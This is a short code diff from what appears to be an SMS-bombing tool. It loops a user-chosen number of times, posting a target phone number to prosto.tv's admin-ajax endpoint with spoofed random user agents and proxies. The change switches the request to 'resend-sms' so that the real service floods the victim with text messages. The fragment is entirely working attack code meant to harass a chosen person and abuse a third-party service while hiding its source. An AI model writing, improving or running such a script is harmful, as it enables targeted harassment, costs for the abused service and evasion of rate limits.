@@ -49,7 +49,7 @@ run = int(console.input('[green]Введите количество повтор
 for _ in track(range(run)):
  headers = {"User-Agent": fake_useragent.UserAgent().random}
  try:
-         requests.post("https://prosto.tv/wp-admin/admin-ajax.php", data={"action": "check-phone", "phone": "+" + number, "username": "Руслан", "_nonce": "f756e84935"}, headers=headers, proxies=proxies)
+         requests.post("https://prosto.tv/wp-admin/admin-ajax.php", data={"action": "resend-sms", "phone": number, "_nonce": "f756e84935"}, headers=headers, proxies=proxies)
          print('prosto.tv')
  except:
          print('Не отправлено (prosto.tv)')
